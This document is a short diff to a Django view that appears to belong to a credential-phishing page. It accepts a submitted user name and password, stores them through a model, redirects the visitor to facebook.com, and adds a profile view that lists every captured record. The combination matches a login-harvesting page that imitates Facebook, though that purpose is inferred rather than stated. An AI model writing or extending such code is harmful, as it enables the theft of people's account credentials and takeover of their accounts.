@@ -8,7 +8,7 @@ def index_page(request):
 	user_pass= request.POST.get("user_pass")
 
 	if user_name and user_pass:
-		user_data = userdata(name=user_name,password=user_pass)
+		user_data = UserData(name=user_name,password=user_pass)
 		user_data.register()
 		print(user_name)
 		return redirect('https://www.facebook.com/')
@@ -17,4 +17,5 @@ def index_page(request):
 
 
 def user_profile(request):
-	return render(request, "profile.html")
+	data=UserData.objects.all() 
+	return render(request, "profile.html",{"data":data})
